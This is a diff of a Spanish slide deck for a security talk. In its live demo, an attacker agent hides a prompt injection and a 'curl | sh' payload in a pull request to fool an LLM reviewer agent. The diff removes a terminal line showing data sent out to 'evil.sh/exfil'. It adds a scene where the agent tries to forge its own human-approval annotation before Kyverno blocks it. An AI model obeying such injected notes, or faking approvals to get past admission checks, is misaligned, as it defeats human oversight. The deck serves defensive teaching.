@@ -239,7 +239,7 @@
   <section class="slide">
     <div class="kicker">Reglas del duelo</div>
     <h2>Dos agentes <span class="accent-amber">LangChain</span>, hablando por <span class="accent-amber">A2A</span></h2>
-    <h3>Ambos son agentes reales (loop LLM + tools), dentro de una Task de Tekton sobre OpenShift.</h3>
+    <h3>Ambos son agentes reales (loop LLM + tools), en un pipeline Tekton de 9 etapas sobre mi clúster k3s.</h3>
     <div class="duel" style="margin-top:1.2em">
       <div class="node red">
         <div class="hdr">● AGENTE ROJO</div>
@@ -276,7 +276,8 @@
       como <b>servicio en su propio sandbox</b> (A2A server, sin token ni internet) y el rojo como <b>step</b> que lo consume por
       localhost. El <code>merge-deploy</code> solo corre si la decisión es APPROVE (Tekton <code>when</code>).
       Lo clave es la flecha ámbar de abajo: el único canal que el azul <b>tiene</b> que leer (el diff)
-      es el mismo que el rojo <b>controla</b>. Ahí vive el ataque. Repo y clúster propios, nunca terceros.
+      es el mismo que el rojo <b>controla</b>. Ahí vive el ataque. Todo corre en <b>mi clúster k3s</b>
+      (homelab propio) con un <b>vLLM local</b>: sin terceros, sin API keys, sin datos saliendo.
     </div>
   </section>
 
@@ -301,10 +302,10 @@
         <div class="card green"><h4>Modo <code>rules</code> · offline</h4>
           <p class="muted">Decisión determinista por reglas. <span class="accent-green">Sin API key, sin
             egress</span>, solo stdlib. Es el <strong>fallback</strong> para la demo en vivo en el pod aislado.</p></div>
-        <div class="card amber"><h4>Modo <code>llm</code> · A2A + LLM real</h4>
-          <p class="muted">El azul <strong>razona con un LLM externo</strong> por A2A real. Requiere la API key
-            en un Secret y <span class="accent-amber">egress HTTPS (443)</span>. Si falta la key o las deps,
-            cae solo a <code>rules</code>.</p></div>
+        <div class="card amber"><h4>Modo <code>llm</code> · LLM real, local</h4>
+          <p class="muted">El azul <strong>razona con un LLM de verdad</strong>: vLLM
+            (<span class="accent-amber">Qwen3-8B</span>) en la GPU del homelab. Sin API key y sin salir a
+            internet. Si el modelo no responde, cae solo a <code>rules</code> y lo registra.</p></div>
       </div>
     </div>
     <div class="notes-src">
@@ -312,10 +313,10 @@
       Aclara que los agentes son reales: el azul es un <b>revisor LLM con tools</b> (LangChain /
       langgraph <code>create_react_agent</code>), no un clasificador suelto — el clasificador es solo una
       de sus tools (<code>run_injection_classifier</code>), junto con <code>check_dangerous_patterns</code>.
-      Se exponen por <b>A2A</b> (<code>a2a-sdk</code>). Dos modos: <b>rules</b> (offline, sin API key, el que
-      corre en el pod aislado de la demo) y <b>llm</b> (A2A real contra un LLM externo, necesita key en
-      Secret + egress 443). Si no hay key o deps, cae a rules y lo registra — por eso la demo en vivo es
-      robusta aunque no haya red.
+      Se exponen por <b>A2A</b> (<code>a2a-sdk</code>). Dos modos: <b>rules</b> (determinista, el que corre
+      en los actos) y <b>llm</b> (razona con el <b>vLLM local</b>, Qwen3-8B en la GPU del homelab). Si el
+      modelo no responde, cae a rules y lo registra — por eso la demo en vivo aguanta aunque la GPU esté
+      ocupada. Importante para el Acto 3: con el LLM real el resultado <b>cambia</b>, y eso se cuenta.
     </div>
   </section>
 
@@ -437,28 +438,59 @@
         </ul>
       </div>
       <div class="term">
-        <div class="tt"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="ttl">argocd · sync</span></div>
-<pre><span class="c-cmt"># merge aceptado por el agente azul</span>
-<span class="c-key">app</span>  pipeline-demo   <span class="c-add">Synced</span>
-<span class="c-key">rev</span>  58c0ffee        <span class="c-add">Healthy</span>
-<span class="c-cmt"># warm-cache.sh ejecutándose en el runner…</span>
-<span class="c-del">[runner] POST evil.sh/exfil  200 OK</span></pre>
+        <div class="tt"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="ttl">k3s · la admisión frena al agente (2 intentos)</span></div>
+<pre><span class="c-cmt"># el azul aprobó; el agente intenta desplegar con su credencial</span>
+<span class="c-key">[deploy]</span> sa: devsecops-duel:sample-app-deployer
+<span class="c-del">denied: require-human-approval — sin la anotación de aprobación humana</span>
+<span class="c-cmt"># intento 2: el agente se pone él mismo la aprobación</span>
+<span class="c-del">denied: solo entra lo que aplica Argo CD (un commit revisado)</span></pre>
       </div>
     </div>
     <p style="margin-top:1.2em;font-size:clamp(18px,2.4vw,26px)" class="accent-red">
-      El atacante ganó — <strong>a través del defensor</strong>.</p>
-    <p class="accent-amber" style="margin-top:.6em;max-width:72ch">▸ Y hay un costo extra: poner un LLM
-      externo en el azul (modo <code>llm</code>) <strong>obliga a abrir egress HTTPS (443)</strong> — relaja
-      el aislamiento a propósito y suma superficie: exfiltración por el canal del LLM, dependencia de un tercero.</p>
+      El atacante ganó el <strong>gate</strong> — a través del defensor.</p>
+    <p class="accent-green" style="margin-top:.6em;max-width:74ch">▸ Pero <strong>no llegó a desplegar</strong>:
+      Kyverno rechazó sus dos intentos. La frontera que lo paró no fue el prompt del azul,
+      fue la <strong>admisión</strong>.</p>
     <div class="notes-src">
       <span class="t">30–38 min · Acto 3 (el clímax, en vivo)</span>
-      <b>DEMO.</b> El azul aprueba. El merge pasa. Argo CD sincroniza solo y el payload corre. Pausa aquí:
-      este es el punto de la charla. El atacante no rompió un muro — <b>convenció a tu guardia</b>. Y GitOps,
-      que querías para automatizar, acaba de automatizar el compromiso. Matiz nuevo e importante: si el azul
-      usa un <b>LLM externo</b> (modo llm), la NetworkPolicy tiene que <b>abrir egress 443</b> para llegar a
-      la API — es decir, meter el LLM en el pipeline <b>relaja el aislamiento a propósito</b> y abre un canal
-      de exfiltración y una dependencia de un tercero. Refuerza la tesis: la infraestructura es la frontera.
-      Deja que cale antes del Acto 4.
+      <b>DEMO.</b> El azul aprueba el PR envenenado: el atacante <b>ganó el gate</b>. Pausa aquí — no rompió
+      un muro, <b>convenció a tu guardia</b>. Pero sigue: el agente intenta desplegar con su credencial y
+      <b>Kyverno lo rechaza dos veces</b> (sin aprobación humana; y aunque se la falsifique, solo entra lo
+      que aplica Argo CD). Ese es el giro: <b>el control que lo paró no es del modelo, es de la plataforma</b>.
+      Di también lo incómodo (ver slide siguiente): con el LLM real el azul <b>no cayó</b> en esta inyección.
+    </div>
+  </section>
+
+
+  <!-- 7b · LO QUE NO SALIÓ COMO EN EL GUION -->
+  <section class="slide">
+    <div class="kicker amber">Resultado propio · lo que no salió como en el guion</div>
+    <h2>Con el <span class="accent-amber">LLM real</span>, el azul no cayó</h2>
+    <h3>Mismo PR envenenado, mismo agente, dos motores. El resultado cambia — y eso también es el hallazgo.</h3>
+    <div class="grid g2" style="margin-top:1.1em;align-items:start">
+      <div class="card red"><h4>Motor <code>rules</code> · el del Acto 3</h4>
+        <p class="muted">Obedecer la nota al revisor está <strong>programado a propósito</strong>:
+          reproduce el fallo de diseño. <span class="accent-red">APPROVE</span>, 3/3.</p></div>
+      <div class="card green"><h4>Motor <code>llm</code> · Qwen3-8B local</h4>
+        <p class="muted">Ve el <code>curl | sh</code> escondido tras la nota y lo bloquea.
+          <span class="accent-green">BLOCK, 5/5</span> (vulnerable y endurecido).</p></div>
+    </div>
+    <div class="term" style="margin-top:1.1em">
+      <div class="tt"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="ttl">blue-reviewer · AGENT_MODE=llm · 5 corridas</span></div>
+<pre><span class="c-add">BLOCK</span> motor=llm nota_obedecida=False  <span class="c-cmt"># "patrones peligrosos: curl -fsSL ... | sh"</span>
+<span class="c-add">BLOCK</span> motor=llm nota_obedecida=False  <span class="c-cmt"># 5/5, también en la postura vulnerable</span></pre>
+    </div>
+    <p style="margin-top:1.1em" class="accent-amber">▸ Un modelo mejor sube el listón; <strong>no lo
+      convierte en control</strong>. El atacante itera el encuadre; la admisión no negocia.</p>
+    <div class="notes-src">
+      <span class="t">(dentro de 30–38 min) · Honestidad del lab</span>
+      Cuenta esto en vez de esconderlo: es lo que separa una demo de un experimento. Con el motor de reglas
+      el azul obedece la nota — está escrito así, reproduce el fallo. Con el <b>vLLM local (Qwen3-8B)</b>
+      bloqueó <b>5 de 5</b>, porque este payload lleva un <code>curl | sh</code> muy visible. Dos lecturas, y
+      las dos sirven: (1) con un payload más limpio el modelo podría caer — el ataque es iterable y barato;
+      (2) justo por eso <b>no puedes apoyar el control en el modelo</b>. Si alguien pregunta "¿entonces tu
+      demo es falsa?": no, el Acto 3 muestra el fallo de diseño (mezclar dato e instrucción) y la
+      medición con LLM está publicada tal cual salió.
     </div>
   </section>
 
@@ -480,6 +512,9 @@
       <div class="card blue"><h4>Input como DATO, no instrucción</h4>
         <p class="muted">El diff del atacante se trata como <strong>dato no confiable</strong>,
         nunca como instrucción para el LLM. Nada de mezclar contenido y prompt de sistema.</p></div>
+      <div class="card green"><h4>Admisión: solo entra lo que viene de Git</h4>
+        <p class="muted">Kyverno exige aprobación humana <strong>y</strong> que lo aplique Argo CD.
+        <span class="accent-green">Es lo que paró el ataque</span> cuando el gate ya estaba perdido.</p></div>
     </div>
     <div class="notes-src">
       <span class="t">38–46 min · Acto 4 (la tesis)</span>
@@ -487,6 +522,44 @@
       de infra, las mismas de mi charla 1. Recalca: aísla el runner y limita el radio de explosión; separa
       credenciales; y el principio que lo resume todo — <b>contenido del atacante = dato, jamás instrucción</b>.
       Metodología de aislamiento basada en el trabajo de Roy Belio (Red Hat).
+    </div>
+  </section>
+
+
+  <!-- 8b · HUMAN IN THE LOOP EN BACKSTAGE -->
+  <section class="slide">
+    <div class="act-no accent-blue">04</div>
+    <div class="kicker blue">Acto 4 · la frontera, en una pantalla</div>
+    <h2>El agente propone. <span class="accent-blue">La persona confirma.</span></h2>
+    <h3>Dos agentes más en Backstage: uno revisa cada corrida, otro propone el arreglo. Ninguno aplica nada solo.</h3>
+    <div class="grid g2" style="margin-top:1em;align-items:start">
+      <div class="card blue"><h4>Agente de aprobación · segunda opinión</h4>
+        <p class="muted">No se fía del azul: con los resultados reales de cada etapa y el diff, el modelo
+          revisa el PR y dice si <strong>al azul lo engañaron</strong>, citando la línea literal de la
+          inyección. No puede recomendar aprobar una corrida con etapas fallidas.</p></div>
+      <div class="card green"><h4>Agente de remediación · propone el arreglo</h4>
+        <p class="muted">Analiza la imagen sobre <strong>hechos calculados</strong> (quién corre, qué carga
+          nginx), lee los lineamientos del catálogo por <strong>MCP</strong> y propone el cambio.
+          Se aplica con un botón, en una rama: <span class="accent-green">nunca en main</span>.</p></div>
+    </div>
+    <div class="grid g3" style="margin-top:14px">
+      <div class="card"><h4>El modelo decide</h4><p class="muted">qué es real, qué riesgo tiene aquí
+        y qué quitar.</p></div>
+      <div class="card"><h4>El esquema acota</h4><p class="muted">solo puede citar CVE, paquetes y
+        lineamientos que existen.</p></div>
+      <div class="card"><h4>El código verifica</h4><p class="muted">y <strong>muestra cada error que le
+        corrigió</strong> al modelo.</p></div>
+    </div>
+    <p style="margin-top:1.1em" class="accent-green">▸ Resultado propio: el cambio que decidió el modelo baja
+      la imagen de <strong>37 a 13</strong> vulnerabilidades HIGH, y la app sigue sirviendo.</p>
+    <div class="notes-src">
+      <span class="t">(dentro de 38–46 min) · Human in the loop en Backstage</span>
+      <b>DEMO.</b> Enseña la pestaña: eliges la corrida, ves el análisis del modelo, sus consultas MCP al
+      catálogo y <b>lo que el verificador le corrigió</b>. Escribe "aplica R2": aparece la acción pendiente
+      con el diff exacto y el destino. Pulsa <b>Confirmar</b> → sube una rama, nunca main (ruleset probado:
+      GH013). Insiste en el patrón: <b>el modelo decide, el esquema acota, el código verifica</b>; y lo que
+      llega a la persona es un diff que puede leer en 10 segundos. El 37 → 13 está medido reconstruyendo la
+      imagen y reescaneando con Trivy.
     </div>
   </section>
 
@@ -507,29 +580,28 @@
       </div>
       <div class="term">
         <div class="tt"><span class="dot d1"></span><span class="dot d2"></span><span class="dot d3"></span><span class="ttl">reproducir el duelo</span></div>
-<pre><span class="c-cmt"># laptop · modo rules (sin red, sin API key)</span>
+<pre><span class="c-cmt"># laptop · motor rules (sin red, sin modelo)</span>
 cd ../04-ai-agents && uv run run-duel
-<span class="c-cmt"># modo llm + A2A real: AGENT_MODE=llm + API key</span>
+<span class="c-cmt"># motor llm: AGENT_MODE=llm contra tu propio vLLM</span>
 
-<span class="c-cmt"># clúster · Tekton (k3s): 8 etapas + supply chain real</span>
+<span class="c-cmt"># clúster · Tekton: 9 etapas, un PipelineRun por acto</span>
 argocd app sync ai-red-vs-blue-devsecops-pipeline-runs \
-  --resource tekton.dev:PipelineRun:act3-prompt-injected-pr   <span class="c-cmt"># un PipelineRun por acto</span></pre>
-        <p class="muted" style="margin-top:.8em;font-size:12.5px">Ya corrió de punta a punta en
-          <strong>OpenShift 4.22</strong>: imagen propia del registry interno, SCC <span class="accent-green">restricted-v2</span>
-          asignó <span class="accent-green">runAsUser=1000980000</span> (del rango del namespace, no uid 1000 fijo),
-          el azul respondió <span class="accent-red">decision=APPROVE</span> al PR envenenado y se disparó el merge/deploy.</p>
+  --resource tekton.dev:PipelineRun:act3-prompt-injected-pr</pre>
+        <p class="muted" style="margin-top:.8em;font-size:12.5px">Corre de punta a punta en
+          <strong>mi clúster k3s</strong>: imágenes propias firmadas por Tekton Chains, registry interno,
+          <strong>vLLM local</strong> (sin API keys ni datos fuera), Kyverno en la admisión y Argo CD
+          desplegando. Agentes, políticas y evidencias, todo en los repos.</p>
       </div>
     </div>
     <div class="notes-src">
       <span class="t">46–49 min · Checklist y lab</span>
       Cuatro preguntas que cada quien se lleva para hacerse mañana en su pipeline. Insiste: el lab es público
-      y reproducible. En laptop corre en <b>modo rules</b> (sin red, sin API key) o en <b>modo llm + A2A real</b>
-      (con key). En el clúster corre sobre <b>Tekton</b> desde una <b>imagen propia firmada</b> (uv, base fijada por digest, sin código por
-      ConfigMap): el azul es un servicio A2A en sandbox, el rojo un step. Credibilidad: <b>ya se ejecutó en OpenShift 4.22 real</b>
-      — la SCC <b>restricted-v2</b> asignó <code>runAsUser=1000980000</code> (del rango del namespace, exactamente
-      la diferencia OpenShift vs K8s vanilla), el azul aprobó el PR envenenado (<code>decision=APPROVE</code>,
-      score 0.999999 → 0.0007) y se disparó el merge/deploy. Si no te crees los números, córrelos tú. Da la URL
-      del repo (ajústala a la real antes de la charla).
+      y reproducible. En laptop corre con el motor <b>rules</b> (sin red, sin modelo) o <b>llm</b> contra tu
+      propio vLLM. En el clúster corre sobre <b>Tekton</b> (9 etapas) desde <b>imágenes propias firmadas</b>
+      por Tekton Chains: el azul es un servicio A2A en sandbox, el rojo un step. Todo en <b>mi k3s</b>, con
+      <b>modelo local</b>: nada sale a terceros. Números medidos y publicados: el azul aprueba el PR
+      envenenado en motor rules, Kyverno rechaza los dos intentos de despliegue, el LLM bloquea 5/5, y el
+      cambio del agente de remediación baja la imagen de 37 a 13 HIGH. Si no te crees los números, córrelos tú.
     </div>
   </section>
 
@@ -560,7 +632,7 @@ argocd app sync ai-red-vs-blue-devsecops-pipeline-runs \
 
 <!-- chrome -->
 <div class="progress"><span id="pbar"></span></div>
-<div class="counter"><span id="cur">1</span> / <span id="total">11</span></div>
+<div class="counter"><span id="cur">1</span> / <span id="total">13</span></div>
 <div class="hint"><kbd>←</kbd> <kbd>→</kbd> navegar · <kbd>N</kbd> notas · <kbd>F</kbd> pantalla completa</div>
 
 <div class="notes" id="notes"><h5>Notas del ponente</h5><div id="notes-body"></div></div>
